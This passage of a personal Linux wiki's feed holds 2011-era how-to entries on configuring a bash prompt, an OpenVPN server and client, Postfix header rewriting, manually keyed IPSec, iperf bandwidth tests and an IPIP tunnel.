&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&amp;lt;&lt;span class="s1"&gt;&amp;#39;EOF&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; ~/.bashrc
&lt;span class="gp"&gt;PS1=&amp;quot;${debian_chroot:+($debian_chroot)}\\[\\e[01;31m\\]\\u\\[\\e[01;30m\\]@\\[\\e[01;32m\\]\\h\\[\\e[01;30m\\]:\\[\\e[01;34m\\]\\w\\[\\e[01;30m\\]\#&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;e&lt;span class="o"&gt;[&lt;/span&gt;0m&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;EOF&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h3&gt;just&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&amp;lt;&lt;span class="s1"&gt;&amp;#39;EOF&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; ~/.bashrc
&lt;span class="gp"&gt;PS1=&amp;quot;${debian_chroot:+($debian_chroot)}\\[\\e[01;31m\\]\\u\\[\\e[01;30m\\]@\\[\\e[01;32m\\]\\h\\[\\e[01;30m\\]:\\[\\e[01;34m\\]\\w\\[\\e[01;30m\\]\#&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;e&lt;span class="o"&gt;[&lt;/span&gt;0m&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;EOF&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="ubuntu"></category><category term="debian"></category><category term="bash"></category></entry><entry><title>OpenVPN</title><link href="http://wiki.jokeru.ro/how-to-openvpn.html" rel="alternate"></link><published>2011-02-17T23:23:00+00:00</published><updated>2011-02-17T23:23:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-02-17:/how-to-openvpn.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install openvpn

&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; /usr/share/doc/openvpn/examples/easy-rsa/2.0/
&lt;span class="gp"&gt;$&lt;/span&gt; vi vars
&lt;span class="gp"&gt;$&lt;/span&gt; . ./vars
&lt;span class="gp"&gt;$&lt;/span&gt; ./clean-all
&lt;span class="gp"&gt;$&lt;/span&gt; ./build-ca
&lt;span class="gp"&gt;$&lt;/span&gt; ./build-key-server wiki
&lt;span class="gp"&gt;$&lt;/span&gt; ./build-key road-warrior
&lt;span class="gp"&gt;$&lt;/span&gt; ./build-dh

&lt;span class="gp"&gt;$&lt;/span&gt; mkdir /etc/openvpn/keys
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; keys/
&lt;span class="gp"&gt;$&lt;/span&gt; cp ca.key ca.crt dh1024.pem wiki.key wiki.crt /etc/openvpn/keys/
&lt;span class="gp"&gt;$&lt;/span&gt; openvpn --genkey --secret /etc/openvpn/keys/ta.key …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install openvpn

&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; /usr/share/doc/openvpn/examples/easy-rsa/2.0/
&lt;span class="gp"&gt;$&lt;/span&gt; vi vars
&lt;span class="gp"&gt;$&lt;/span&gt; . ./vars
&lt;span class="gp"&gt;$&lt;/span&gt; ./clean-all
&lt;span class="gp"&gt;$&lt;/span&gt; ./build-ca
&lt;span class="gp"&gt;$&lt;/span&gt; ./build-key-server wiki
&lt;span class="gp"&gt;$&lt;/span&gt; ./build-key road-warrior
&lt;span class="gp"&gt;$&lt;/span&gt; ./build-dh

&lt;span class="gp"&gt;$&lt;/span&gt; mkdir /etc/openvpn/keys
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; keys/
&lt;span class="gp"&gt;$&lt;/span&gt; cp ca.key ca.crt dh1024.pem wiki.key wiki.crt /etc/openvpn/keys/
&lt;span class="gp"&gt;$&lt;/span&gt; openvpn --genkey --secret /etc/openvpn/keys/ta.key

&lt;span class="gp"&gt;$&lt;/span&gt; mkdir /etc/openvpn/ccd
&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/openvpn/ccd/road-warrior

&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/openvpn/server.conf
&lt;span class="gp"&gt;$&lt;/span&gt; /etc/init.d/openvpn start

&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;net.ipv4.ip_forward = 1&amp;quot;&lt;/span&gt; &amp;gt;&amp;gt; /etc/sysctl.conf
&lt;span class="gp"&gt;$&lt;/span&gt; sysctl -p /etc/sysctl.conf
&lt;span class="gp"&gt;$&lt;/span&gt; iptables -t nat -A POSTROUTING -s &lt;span class="m"&gt;192&lt;/span&gt;.168.10.0/24 -j SNAT --to &lt;span class="m"&gt;50&lt;/span&gt;.60.70.80
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;/etc/openvpn/ccd/road-warrior&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;push &amp;quot;redirect-gateway&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;/etc/openvpn/server.conf&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;local 50.60.70.80&lt;/span&gt;
&lt;span class="go"&gt;port 1194&lt;/span&gt;
&lt;span class="go"&gt;proto udp&lt;/span&gt;
&lt;span class="go"&gt;dev tun0&lt;/span&gt;
&lt;span class="go"&gt;server 192.168.10.0 255.255.255.0&lt;/span&gt;

&lt;span class="go"&gt;ca keys/ca.crt&lt;/span&gt;
&lt;span class="go"&gt;cert keys/wiki.crt&lt;/span&gt;
&lt;span class="go"&gt;key keys/wiki.key&lt;/span&gt;
&lt;span class="go"&gt;dh keys/dh1024.pem&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;crl-verify keys/crl.pem
&lt;span class="go"&gt;tls-server&lt;/span&gt;
&lt;span class="go"&gt;tls-auth keys/ta.key 0&lt;/span&gt;
&lt;span class="go"&gt;cipher AES-256-CBC&lt;/span&gt;
&lt;span class="go"&gt;tls-cipher DHE-RSA-AES256-SHA&lt;/span&gt;
&lt;span class="go"&gt;comp-lzo&lt;/span&gt;

&lt;span class="go"&gt;client-config-dir ccd&lt;/span&gt;

&lt;span class="go"&gt;tun-mtu 1500&lt;/span&gt;
&lt;span class="go"&gt;fragment 1400&lt;/span&gt;
&lt;span class="go"&gt;mssfix&lt;/span&gt;

&lt;span class="go"&gt;keepalive 1 15&lt;/span&gt;
&lt;span class="go"&gt;persist-key&lt;/span&gt;
&lt;span class="go"&gt;persist-tun&lt;/span&gt;

&lt;span class="go"&gt;cd /etc/openvpn&lt;/span&gt;
&lt;span class="go"&gt;daemon&lt;/span&gt;
&lt;span class="go"&gt;user nobody&lt;/span&gt;
&lt;span class="go"&gt;group nogroup&lt;/span&gt;
&lt;span class="go"&gt;chroot .&lt;/span&gt;
&lt;span class="go"&gt;writepid openvpn.pid&lt;/span&gt;
&lt;span class="go"&gt;status openvpn-status.log&lt;/span&gt;
&lt;span class="go"&gt;log-append /var/log/openvpn.log&lt;/span&gt;
&lt;span class="go"&gt;verb 3&lt;/span&gt;
&lt;span class="go"&gt;mute 20&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;[http://openvpn.se/files/binary/openvpn-gui-1.0.3.exe|http://openvpn.se/files/binary/openvpn-gui-1.0.3.exe]&lt;/h3&gt;
&lt;h3&gt;C:\Program Files\OpenVPN\config\wiki\wiki.ovpn&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;client&lt;/span&gt;
&lt;span class="go"&gt;remote 50.60.70.80 1194&lt;/span&gt;
&lt;span class="go"&gt;nobind&lt;/span&gt;
&lt;span class="go"&gt;dev tun&lt;/span&gt;
&lt;span class="go"&gt;proto udp&lt;/span&gt;

&lt;span class="go"&gt;ca ca.crt&lt;/span&gt;
&lt;span class="go"&gt;cert road-warrior.crt&lt;/span&gt;
&lt;span class="go"&gt;key road-warrior.key&lt;/span&gt;
&lt;span class="go"&gt;tls-auth ta.key 1&lt;/span&gt;
&lt;span class="go"&gt;tls-remote wiki&lt;/span&gt;
&lt;span class="go"&gt;ns-cert-type server&lt;/span&gt;
&lt;span class="go"&gt;cipher AES-256-CBC&lt;/span&gt;
&lt;span class="go"&gt;tls-cipher DHE-RSA-AES256-SHA&lt;/span&gt;
&lt;span class="go"&gt;comp-lzo&lt;/span&gt;

&lt;span class="go"&gt;tun-mtu 1500&lt;/span&gt;
&lt;span class="go"&gt;fragment 1400&lt;/span&gt;
&lt;span class="go"&gt;mssfix&lt;/span&gt;

&lt;span class="go"&gt;persist-key&lt;/span&gt;
&lt;span class="go"&gt;persist-tun&lt;/span&gt;

&lt;span class="go"&gt;mute-replay-warnings&lt;/span&gt;
&lt;span class="go"&gt;pause-exit&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="ubuntu"></category><category term="tunnel"></category><category term="openvpn"></category></entry><entry><title>Postfix Headers CleanUp</title><link href="http://wiki.jokeru.ro/how-to-postfix-headers-cleanup.html" rel="alternate"></link><published>2011-01-31T07:30:00+00:00</published><updated>2011-01-31T07:30:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-01-31:/how-to-postfix-headers-cleanup.html</id><summary type="html">&lt;p&gt;Set up Postfix to remove / change specific headers within emails that
pass through their systems. The most common use for this is to set up a
relaying server that will remove any reference of where source emails
originated and relevant information about the sender's computer. Another
useful application for this …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Set up Postfix to remove / change specific headers within emails that
pass through their systems. The most common use for this is to set up a
relaying server that will remove any reference of where source emails
originated and relevant information about the sender's computer. Another
useful application for this type of header_checks is to remove details
about additional functions of your mail server that you do not want made
available to the world.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/postfix/main.cf
&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/postfix/headers-cleanup
&lt;span class="gp"&gt;$&lt;/span&gt; service postfix reload
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;/etc/postfix/main.cf&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;.....&lt;/span&gt;
&lt;span class="go"&gt;header_checks = regexp:/etc/postfix/headers-cleanup&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;/etc/postfix/headers-cleanup&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;/^Message-Id: &amp;lt;(.*)@mail.wiki.ro&amp;gt;$/ REPLACE Message-Id: &amp;lt;$1@wiki.jokeru.ro&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;/^Received: by mail.wiki.ro (.*)$/ REPLACE Received: by wiki.jokeru.ro $1&lt;/span&gt;
&lt;span class="go"&gt;/^Received: from mail.wiki.ro/ IGNORE&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="mail"></category><category term="postfix"></category></entry><entry><title>IPSec Transport Mode with Manual Keys</title><link href="http://wiki.jokeru.ro/how-to-ipsec-transport-mode-with-manual-keys.html" rel="alternate"></link><published>2011-01-19T22:15:00+00:00</published><updated>2011-01-19T22:15:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-01-19:/how-to-ipsec-transport-mode-with-manual-keys.html</id><summary type="html">&lt;h3&gt;Server_1 - 192.168.1.1&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install ipsec-tools
&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&amp;lt;&lt;span class="s1"&gt;&amp;#39;EOF&amp;#39;&lt;/span&gt; &amp;gt; /etc/ipsec-tools.conf
&lt;span class="gp"&gt;#&lt;/span&gt;!/usr/sbin/setkey -f

&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# Flush the SAD and SPD&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# SAD = Security Association Database&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# SPD = Security Policy Database&lt;/span&gt;
&lt;span class="go"&gt;flush;&lt;/span&gt;
&lt;span class="go"&gt;spdflush;&lt;/span&gt;

&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# AH = Authentication Header&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# AH SAs using 128 bit long keys - dd if=/dev/random count=16 bs=1 …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h3&gt;Server_1 - 192.168.1.1&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install ipsec-tools
&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&amp;lt;&lt;span class="s1"&gt;&amp;#39;EOF&amp;#39;&lt;/span&gt; &amp;gt; /etc/ipsec-tools.conf
&lt;span class="gp"&gt;#&lt;/span&gt;!/usr/sbin/setkey -f

&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# Flush the SAD and SPD&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# SAD = Security Association Database&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# SPD = Security Policy Database&lt;/span&gt;
&lt;span class="go"&gt;flush;&lt;/span&gt;
&lt;span class="go"&gt;spdflush;&lt;/span&gt;

&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# AH = Authentication Header&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# AH SAs using 128 bit long keys - dd if=/dev/random count=16 bs=1 | xxd -ps&lt;/span&gt;
&lt;span class="go"&gt;add 192.168.1.1 192.168.1.2 ah 0x100 -A hmac-md5 0xe30415cf6ce70bd6d38ebf203822d869;&lt;/span&gt;
&lt;span class="go"&gt;add 192.168.1.2 192.168.1.1 ah 0x200 -A hmac-md5 0x5954d4400c8ef23b3025c6cb1a62894c;&lt;/span&gt;

&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# ESP = Encapsulated Security Payload&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# ESP SAs using 192 bit long keys (168 + 24 parity) - dd if=/dev/random count=24 bs=1 | xxd -ps&lt;/span&gt;
&lt;span class="go"&gt;add 192.168.1.1 192.168.1.2 esp 0x101 -E 3des-cbc 0x2fc9ec8da583ba15371d6ebfaef1344772720d61911e1e73;&lt;/span&gt;
&lt;span class="go"&gt;add 192.168.1.2 192.168.1.1 esp 0x201 -E 3des-cbc 0x9d0ae2ed9b24798d705be82c15404bf00f56bd1537d37d07;&lt;/span&gt;

&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# Security Policies&lt;/span&gt;
&lt;span class="go"&gt;spdadd 192.168.1.1 192.168.1.2 any -P out ipsec esp/transport//require ah/transport//require;&lt;/span&gt;
&lt;span class="go"&gt;spdadd 192.168.1.1 192.168.1.2 any -P in ipsec esp/transport//require ah/transport//require;&lt;/span&gt;
&lt;span class="go"&gt;EOF&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; chmod &lt;span class="m"&gt;750&lt;/span&gt; /etc/ipsec-tools.conf

&lt;span class="gp"&gt;$&lt;/span&gt; /etc/init.d/setkey start
&lt;span class="gp"&gt;$&lt;/span&gt; /etc/init.d/setkey stop

&lt;span class="gp"&gt;$&lt;/span&gt; setkey -D
&lt;span class="gp"&gt;$&lt;/span&gt; setkey -DP
&lt;span class="gp"&gt;$&lt;/span&gt; setkey -F
&lt;span class="gp"&gt;$&lt;/span&gt; setkey -FP
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Server_2 - 192.168.1.2&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install ipsec-tools
&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&amp;lt;&lt;span class="s1"&gt;&amp;#39;EOF&amp;#39;&lt;/span&gt; &amp;gt; /etc/ipsec-tools.conf
&lt;span class="gp"&gt;#&lt;/span&gt;!/usr/sbin/setkey -f

&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# Flush the SAD and SPD&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# SAD = Security Association Database&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# SPD = Security Policy Database&lt;/span&gt;
&lt;span class="go"&gt;flush;&lt;/span&gt;
&lt;span class="go"&gt;spdflush;&lt;/span&gt;

&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# AH = Authentication Header&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# AH SAs using 128 bit long keys - dd if=/dev/random count=16 bs=1 | xxd -ps&lt;/span&gt;
&lt;span class="go"&gt;add 192.168.1.1 192.168.1.2 ah 0x100 -A hmac-md5 0xe30415cf6ce70bd6d38ebf203822d869;&lt;/span&gt;
&lt;span class="go"&gt;add 192.168.1.2 192.168.1.1 ah 0x200 -A hmac-md5 0x5954d4400c8ef23b3025c6cb1a62894c;&lt;/span&gt;

&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# ESP = Encapsulated Security Payload&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# ESP SAs using 192 bit long keys (168 + 24 parity) - dd if=/dev/random count=24 bs=1 | xxd -ps&lt;/span&gt;
&lt;span class="go"&gt;add 192.168.1.1 192.168.1.2 esp 0x101 -E 3des-cbc 0x2fc9ec8da583ba15371d6ebfaef1344772720d61911e1e73;&lt;/span&gt;
&lt;span class="go"&gt;add 192.168.1.2 192.168.1.1 esp 0x201 -E 3des-cbc 0x9d0ae2ed9b24798d705be82c15404bf00f56bd1537d37d07;&lt;/span&gt;

&lt;span class="gp"&gt;#&lt;/span&gt;&lt;span class="c1"&gt;# Security Policies&lt;/span&gt;
&lt;span class="go"&gt;spdadd 192.168.1.2 192.168.1.1 any -P out ipsec esp/transport//require ah/transport//require;&lt;/span&gt;
&lt;span class="go"&gt;spdadd 192.168.1.2 192.168.1.1 any -P in ipsec esp/transport//require ah/transport//require;&lt;/span&gt;
&lt;span class="go"&gt;EOF&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; chmod &lt;span class="m"&gt;750&lt;/span&gt; /etc/ipsec-tools.conf

&lt;span class="gp"&gt;$&lt;/span&gt; /etc/init.d/setkey start
&lt;span class="gp"&gt;$&lt;/span&gt; /etc/init.d/setkey stop

&lt;span class="gp"&gt;$&lt;/span&gt; setkey -D
&lt;span class="gp"&gt;$&lt;/span&gt; setkey -DP
&lt;span class="gp"&gt;$&lt;/span&gt; setkey -F
&lt;span class="gp"&gt;$&lt;/span&gt; setkey -FP
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;Source: &lt;a href="http://www.linux360.ro/forum/tutoriale/rutare-avansata-in-linux-si-controlul-traficului-t8996.html"&gt;http://www.linux360.ro/forum/tutoriale/rutare-avansata-in-linux-si-controlul-traficului-t8996.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</content><category term="linux"></category><category term="ubuntu"></category><category term="tunnel"></category><category term="ipsec"></category></entry><entry><title>Bandwidth test using Iperf</title><link href="http://wiki.jokeru.ro/how-to-bandwidth-test-using-iperf.html" rel="alternate"></link><published>2011-01-19T16:05:00+00:00</published><updated>2011-01-19T16:05:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-01-19:/how-to-bandwidth-test-using-iperf.html</id><summary type="html">&lt;p&gt;Iperf is a simple client/server tool that you can use to test the bandwidth between 2 linux devices.&lt;/p&gt;
&lt;p&gt;For our setup we'll consider the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;Server = 10.20.30.40&lt;/span&gt;
&lt;span class="go"&gt;Client = 50.60.70.80&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;on Server&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install iperf
&lt;span class="gp"&gt;$&lt;/span&gt; iperf -s
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;on Client&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install iperf
&lt;span class="gp"&gt;$&lt;/span&gt; iperf -c …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Iperf is a simple client/server tool that you can use to test the bandwidth between 2 linux devices.&lt;/p&gt;
&lt;p&gt;For our setup we'll consider the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;Server = 10.20.30.40&lt;/span&gt;
&lt;span class="go"&gt;Client = 50.60.70.80&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;on Server&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install iperf
&lt;span class="gp"&gt;$&lt;/span&gt; iperf -s
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;on Client&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install iperf
&lt;span class="gp"&gt;$&lt;/span&gt; iperf -c &lt;span class="m"&gt;10&lt;/span&gt;.20.30.40
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="ubuntu"></category><category term="bandwidth"></category><category term="iperf"></category></entry><entry><title>IPIP Tunnel</title><link href="http://wiki.jokeru.ro/how-to-ipip-tunnel.html" rel="alternate"></link><published>2011-01-19T00:10:00+00:00</published><updated>2011-01-19T00:10:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-01-19:/how-to-ipip-tunnel.html</id><summary type="html">&lt;p&gt;IPIP kind of tunnels is the simplest one. It has the lowest overhead,
but can incapsulate only IPv4 unicast traffic, so you will not be able
to setup OSPF, RIP or any other multicast-based protocol. You can setup
only one tunnel for unique tunnel endpoints pair. It can work with …&lt;/p&gt;</summary><content type="html">&lt;p&gt;IPIP kind of tunnels is the simplest one. It has the lowest overhead,
but can incapsulate only IPv4 unicast traffic, so you will not be able
to setup OSPF, RIP or any other multicast-based protocol. You can setup
only one tunnel for unique tunnel endpoints pair. It can work with
FreeBSD and cisco IOS. Kernel module is 'ipip'.&lt;/p&gt;
&lt;p&gt;The following setup will configure an IPIP tunnel between Node 1 (having
10.20.30.40 as public IP) and Node 2 (having 50.60.70.80 as public IP).
The IPIP tunnel subnet used will be 192.168.1.0/30 since we only need 2
IPs. We'll also route 2 other subnets from Node 1 to Node 2 and from
Node 2 to Node 1 using the newly created IPIP interfaces.&lt;/p&gt;
&lt;h3&gt;Server_1&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; modprobe ipip
&lt;span class="gp"&gt;$&lt;/span&gt; ip tunnel add ipip1 mode ipip &lt;span class="nb"&gt;local&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.20.30.40 remote &lt;span class="m"&gt;50&lt;/span&gt;.60.70.80
&lt;span class="gp"&gt;$&lt;/span&gt; ip address add dev ipip1 &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1 peer &lt;span class="m"&gt;192&lt;/span&gt;.168.1.2/30
&lt;span class="gp"&gt;$&lt;/span&gt; ip link &lt;span class="nb"&gt;set&lt;/span&gt; dev ipip1 up
&lt;span class="gp"&gt;$&lt;/span&gt; ip route add &lt;span class="m"&gt;172&lt;/span&gt;.16.20.0/24 via &lt;span class="m"&gt;192&lt;/span&gt;.168.1.2

&lt;span class="gp"&gt;$&lt;/span&gt; ip link show ipip1  
&lt;span class="gp"&gt;$&lt;/span&gt; ifconfig ipip1  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Server_2&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ modprobe ipip
$ ip tunnel add ipip1 mode ipip &lt;span class="nb"&gt;local&lt;/span&gt; &lt;span class="m"&gt;50&lt;/span&gt;.60.70.80 remote &lt;span class="m"&gt;10&lt;/span&gt;.20.30.40
$ ip address add dev ipip1 &lt;span class="m"&gt;192&lt;/span&gt;.168.1.2 peer &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1/30
$ ip link &lt;span class="nb"&gt;set&lt;/span&gt; dev ipip1 up
$ ip route add &lt;span class="m"&gt;172&lt;/span&gt;.16.10.0/24 via &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1

$ ip link show ipip1
$ ifconfig ipip1

$ ping &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1
PING &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;192&lt;/span&gt;.168.1.1&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;56&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;84&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; bytes of data.
&lt;span class="m"&gt;64&lt;/span&gt; bytes from &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;64&lt;/span&gt; &lt;span class="nv"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;201&lt;/span&gt; ms

$ ping &lt;span class="m"&gt;172&lt;/span&gt;.16.10.1
PING &lt;span class="m"&gt;172&lt;/span&gt;.16.10.1 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.16.10.1&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;56&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;84&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; bytes of data.
&lt;span class="m"&gt;64&lt;/span&gt; bytes from &lt;span class="m"&gt;172&lt;/span&gt;.16.10.1: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;63&lt;/span&gt; &lt;span class="nv"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;211&lt;/span&gt; ms
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Cleanup&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ip tunnel del ipip1
&lt;span class="gp"&gt;$&lt;/span&gt; rmmod ipip
